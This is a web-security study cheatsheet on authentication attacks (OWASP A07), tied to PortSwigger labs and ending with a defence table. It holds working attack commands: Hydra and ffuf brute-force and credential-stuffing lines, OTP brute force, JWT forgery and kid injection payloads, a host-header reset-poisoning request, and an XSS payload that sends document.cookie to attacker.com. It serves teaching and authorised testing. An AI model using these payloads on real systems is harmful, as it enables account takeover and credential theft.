# Authentication —  Cheatsheet
> OWASP Top 10:2025 — A07: Authentication Failures

---

## 1. What is Authentication?

Authentication is the process of **verifying a user's identity** — confirming that you are who you claim to be. It is a core security control for any web application. A flawed authentication mechanism can allow attackers to:

- Bypass login entirely
- Access another user's account
- Escalate privileges to admin
- Take over the entire application

```
Attacker Input  →  Login Endpoint  →  Session Issued
                         ↑
              Target: Exploit this validation step
```

---

## 2. Vulnerability Classes at a Glance

| Vulnerability | Attack Vector | Severity |
|---|---|---|
| Username enumeration | Response/timing differences on login | Medium |
| No rate limiting | Brute force passwords | High |
| Weak password reset token | Predictable/leaked token | High/Critical* |
| MFA bypass | Missing MFA enforcement / OTP attacks | High/Critical* |
| Insecure remember-me cookie | Predictable or forgeable token | High/Critical* |
| Session fixation | Session ID not regenerated | High |
| JWT none/alg confusion | Token forgery if verifier is vulnerable | High/Critical* |
| Credential stuffing | Reuse of compromised credentials | High |
| Password-reset host-header poisoning | Untrusted host used in reset-link generation | High/Critical* |
| Insecure session cookie | Missing/incorrect security attributes | Medium/High |

> **Severity is context-dependent.** The labels above are study-note guidance, not universal CVSS ratings.

---

## 3. Username Enumeration

### Via Different Response Messages

```http
POST /login  →  valid user + wrong pass
Response: "Incorrect password"           ← user EXISTS

POST /login  →  invalid user + wrong pass
Response: "Username does not exist"      ← user NOT FOUND
```

### Via Timing Differences

```python
# A timing difference may exist when valid and invalid usernames follow
# different server-side code paths (for example, password-hash verification).
# Do not assume valid usernames always take longer; measure statistically.

import requests, time
for user in wordlist:
    t = time.time()
    requests.post('/login', data={'username': user, 'password': 'x'})
    print(user, round(time.time() - t, 3))
```

### Via Registration Page

```
Register with: admin → "Username already taken"  ← admin exists
Register with: xyz99 → "Registered successfully" ← xyz99 is new
```

### Burp Intruder Setup

```
Attack type  : Sniper
Position     : username=§FUZZ§&password=wrong
Payload      : SecLists/Usernames/top-usernames-shortlist.txt
Filter on    : Response length / status code / keyword difference
```

---

## 4. Brute Force Attacks

### Hydra

```bash
# HTTP POST login
hydra -l admin -P rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Credential stuffing (user:pass list)
hydra -C leaked_creds.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:failed"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt target.com http-get /admin
```

### ffuf

```bash
# Password brute force (known username)
ffuf -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200   # filter 200 if failed login stays on same page; use -fc 302 if failed login redirects

# Username enumeration
ffuf -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=x" \
  -w usernames.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 5
```

### Burp Intruder — Cluster Bomb

```
Position 1: username=§USER§
Position 2: password=§PASS§
Payload 1: usernames wordlist
Payload 2: passwords wordlist
Filter: 302 redirect / different length
```

---

## 5. Rate Limiting Bypass

```http
# Only relevant if the application/proxy incorrectly trusts
# attacker-controlled client-IP headers.
X-Forwarded-For: §1.1.1.1§
X-Real-IP: §1.1.1.1§
X-Originating-IP: §1.1.1.1§

# Test whether changing a trusted header changes the rate-limit key.
# Do not assume these headers are trusted or effective on every target.
```

```python
# Pitchfork payload pairs (position 1 = IP, position 2 = password)
1.1.1.1 → password1
1.1.1.2 → password2
1.1.1.3 → password3
```

---

## 6. "Remember Me" Cookie Forgery

```bash
# Step 1: Login with "remember me" and capture cookie
Cookie: remember_me=dXNlcjoxMjM=

# Step 2: Decode
echo "dXNlcjoxMjM=" | base64 -d
# Output: user:123

# Step 3: If the application unsafely trusts the decoded user identifier,
# test whether changing it affects the authenticated identity.
echo -n "user:1" | base64
# Output: dXNlcjox

# Step 4: Replace cookie
Cookie: remember_me=dXNlcjox

# Result depends on the target implementation; Base64 encoding alone
# does not make a remember-me token forgeable.
```

---

## 7. Password Reset Attacks

### Token Analysis

```bash
# Request reset → intercept email link
# https://target.com/reset?token=abc123def456

# Check token:
# - Is it time-based? (UNIX timestamp in hex/base64)
# - Is it short or otherwise low-entropy? (length alone does not prove
#   brute-forceability; entropy and server-side validation matter)
# - Does it expire after use?

# Brute force (if short)
ffuf -u https://target.com/reset?token=FUZZ \
  -w tokens.txt -fc 404
```

### Host Header Injection

```http
POST /forgot-password HTTP/1.1
Host: attacker.com             ← injected
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Server may generate:
# https://attacker.com/reset?token=abc123
# This is exploitable only if the application trusts attacker-controlled
# Host/forwarded-host information when constructing the reset URL.
```

### Referer Header Leakage

```
# Reset page loads third-party resources (analytics, fonts)
# Depending on browser policy and application configuration, the URL may be
# sent as a Referer to a third-party resource.
Referer: https://target.com/reset?token=abc123
# Avoid loading third-party resources on sensitive reset pages and use an
# appropriate Referrer-Policy.
```

---

## 8. MFA / 2FA Bypass Techniques

### URL Jump (Logic Bypass)

```
# Normal flow:
POST /login → POST /mfa-verify → GET /dashboard

# Bypass: after step 1, jump directly to:
GET /dashboard
# If server only checks session exists (not MFA complete) → bypassed
```

### OTP Brute Force

```bash
# 4-digit numeric OTP: 10,000 possible combinations (if all values are valid)
ffuf -u https://target.com/mfa \
  -X POST \
  -d "otp=FUZZ" \
  -w <(seq -w 0 9999) \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302

# 6-digit: 1,000,000 combos (use Burp Intruder → Numbers → 000000–999999)
```

### Backup Code Brute Force

```bash
ffuf -u https://target.com/recovery \
  -X POST \
  -d "code=FUZZ" \
  -w <(seq -w 100000 999999) \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302
```

### TOTP Secret Recovery

```python
# A TOTP provisioning URI/QR code may contain the shared secret:
# otpauth://totp/...?secret=BASE32SECRET

# If that secret is improperly exposed, it can be used to generate codes:
import pyotp
print(pyotp.TOTP('BASE32SECRET').now())
```

---

## 9. JWT Attacks

### Decode a JWT

```bash
# JWT = header.payload.signature
# Header and payload are Base64URL-encoded JSON; the signature is not simply
# "decoded" because it is cryptographic data.
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}  # illustrative only; GNU/Linux base64 may need URL-safe decoding

# Use jwt.io or jwt_tool
python3 jwt_tool.py <token>
```

### None Algorithm Attack

```json
// Vulnerable verifier case: attacker changes header:
{"alg": "none"}

// Remove the signature (keep the final dot):
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

// Exploitable only when the verifier incorrectly accepts unsigned tokens.
```

### RS256 → HS256 Algorithm Confusion

```bash
# Server uses RS256 (public/private key)
# Attack: switch to HS256 and sign with the public key as the secret

python3 jwt_tool.py <token> -X k -pk public.pem
```

### Weak Secret Brute Force

```bash
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```

### jwks / jku Header Injection

```json
// In a vulnerable verifier, point jku to an attacker-controlled JWKS:
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
// Exploitable only if the verifier improperly trusts unapproved remote keys.
```

### kid Header Injection

```json
// kid is a key identifier used by the verifier to select a signing key.
// Vulnerabilities depend on how the application resolves the identifier.

// Example test cases in a vulnerable local/lab implementation:
{"kid": "../../dev/null"}
{"kid": "' UNION SELECT 'attacker_key' --"}
```

> `kid` path traversal or SQL injection is **not inherent to JWT**; it results from unsafe key lookup logic.

---

## 10. Session Attacks

### Session Fixation

```
1. Attacker requests session ID before login:
   GET /login → Set-Cookie: PHPSESSID=attacker_value

2. Attacker sends victim a link with that session ID embedded:
   https://target.com/login?PHPSESSID=attacker_value

3. Victim logs in → server doesn't regenerate session ID

4. Attacker reuses same session ID → now authenticated as victim
```

### Session Hijacking via Cookie Theft

```javascript
// XSS payload to steal cookies
<script>document.location='https://attacker.com/?c='+document.cookie</script>

// If HttpOnly is NOT set → cookie is accessible via JS
// If Secure is NOT set → cookie sent over HTTP → sniffable
```

### Predictable Session ID

```bash
# Test session ID entropy with Burp Sequencer
# Burp → HTTP History → right-click Set-Cookie header → Send to Sequencer
# Sequencer collects and analyses token randomness

# Manually check:
# Predictable/sequential IDs or deterministic encodings such as username+timestamp = weak
```

---

## 11. OAuth / SSO Attacks

> **Terminology:** OAuth 2.0 is primarily an authorization framework. OpenID Connect (OIDC) adds an identity layer for authentication. SSO may be implemented with OIDC, SAML, or other federation technologies.


### Missing State Parameter (CSRF)

```
# Depending on the vulnerable flow, OAuth CSRF can cause the victim's session
# to be linked to an attacker's OAuth identity.
# Step 1: Start OAuth flow as attacker, capture authorization URL
# Step 2: Before completing, send URL to victim (without state)
# Step 3: Victim clicks → account linked to attacker's identity
```

### Redirect URI Bypass

```
# Registered: https://app.com/callback

# Candidate validation tests:
https://app.com.attacker.com/callback
https://app.com/callback%40attacker.com
https://app.com/callback/../leak
https://app.com/callback?redirect=https://attacker.com

# Whether any variant bypasses validation depends on the exact URI parser
# and redirect_uri validation rules.
```

### Leaking Code via Referer

```
# If the callback page loads third-party resources, the authorization code
# may be exposed through the Referer header depending on referrer policy and
# browser behavior.
```

---

## 12. Credential Stuffing

```bash
# Use lawfully obtained/test credential pairs or breach-derived datasets
# where their use is authorized and appropriate.
#
# Have I Been Pwned is primarily a breach-exposure checking service; do not
# describe it as a source of downloadable username:password dumps.
# DeHashed and similar services have their own access, legal, and usage terms.

hydra -C creds.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Failed"

# Rotate User-Agent and add delays to avoid detection
hydra -C creds.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Failed" \
  -t 1 -W 3
```

---

## 13. Password Hash Cracking

```bash
# Identify hash type
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hash-identifier

# Hashcat modes
hashcat -m 0    hash.txt wordlist  # MD5
hashcat -m 100  hash.txt wordlist  # SHA-1
hashcat -m 1400 hash.txt wordlist  # SHA-256 (fast hash; not suitable for password storage)
hashcat -m 1800 hash.txt wordlist  # sha512crypt
hashcat -m 3200 hash.txt wordlist  # bcrypt
hashcat -m 16500 token.jwt wordlist # JWT HS256

# With rules (password mutations)
hashcat -m 0 hash.txt wordlist -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=rockyou.txt --format=bcrypt hash.txt
john --show hash.txt
```

---

## 14. Quick Recon Checklist

```
LOGIN PAGE
[ ] Different response for valid vs invalid username?
[ ] Response timing difference?
[ ] Account lockout after N failures?
[ ] CAPTCHA present and bypass-able?
[ ] Is HTTPS enforced? (HTTP should redirect or be disabled)

PASSWORD RESET
[ ] Token entropy — short, predictable, timestamp-based?
[ ] Token expires after use?
[ ] Token expires after time limit?
[ ] Host header injection → link sent to attacker domain?
[ ] Referer header leaks token?

MFA / 2FA
[ ] Can you jump to /dashboard after step 1?
[ ] OTP rate-limited?
[ ] OTP single-use?
[ ] Backup codes rate-limited?
[ ] TOTP secret exposed in QR URL?

SESSION MANAGEMENT
[ ] Burp Sequencer — is token entropy high?
[ ] Cookie has HttpOnly flag?
[ ] Cookie has Secure flag?
[ ] Cookie has SameSite flag?
[ ] Session invalidated on logout?
[ ] Session ID regenerated on login?

REMEMBER ME
[ ] Decode cookie (base64, JWT, hex)?
[ ] Predictable / forgeable?

JWT
[ ] alg: none accepted?
[ ] RS256 → HS256 confusion?
[ ] Weak secret (brute forceable)?
[ ] kid injection (path traversal / SQLi)?
[ ] jku / x5u pointing to attacker domain?
```

---

## 15. Defence Summary

| Control | Implementation |
|---|---|
| Rate limiting | Rate-limit failed authentication and detect automation; avoid account-lockout DoS |
| Password hashing | Prefer Argon2id; use algorithm-specific, tuned parameters |
| Password reset | High-entropy random token, single-use, appropriate short expiry |
| MFA | Prefer phishing-resistant MFA; prefer TOTP over SMS when necessary; validate every step |
| Session cookie | `HttpOnly; Secure; SameSite=Lax/Strict` as appropriate |
| Session lifecycle | Regenerate on login, invalidate on logout and expiry |
| JWT | Pin algorithms; validate issuer/audience/signature and key trust |
| Username enumeration | Generic responses and reduce observable differences |
| Credential stuffing | Check passwords against known-breach data via an appropriate service/API |
| Host header | Generate absolute URLs from trusted configuration; validate forwarded-host handling |

---

## 16. PortSwigger Labs Quick Reference

| Lab | Technique |
|---|---|
| Username enumeration via different responses | Intruder → Sniper → message diff |
| Username enumeration via subtly different responses | Intruder → grep for subtle word diff |
| Username enumeration via response timing | Intruder + timing analysis |
| Password brute-force via account lockout | Test lockout/rate-limit behavior |
| Broken brute-force protection (IP block) | Test whether trusted proxy headers alter the rate-limit key |
| Broken brute-force protection (multiple creds) | JSON array of passwords in one request |
| 2FA simple bypass | Jump to /my-account after step 1 |
| 2FA broken logic | Manipulate `verify` cookie to victim username |
| 2FA OTP brute force | Intruder → Numbers 0000–9999 |
| Offline password cracking | Steal "stay-logged-in" cookie → crack MD5 |
| Password reset broken logic | Modify token + username in reset request |
| Password reset poisoning / host-header issues | Test whether trusted host/forwarded-host configuration can be abused |
| Password brute-force via password change | Change password with wrong current → enumeration |

---

*Reference: OWASP Top 10:2025 A07 — Authentication Failures | OWASP Authentication Cheat Sheet | OWASP Password Storage Cheat Sheet | OWASP Session Management Cheat Sheet | PortSwigger Web Security Academy — Authentication | OAuth | JWT | HackTricks Authentication | jwt.io*
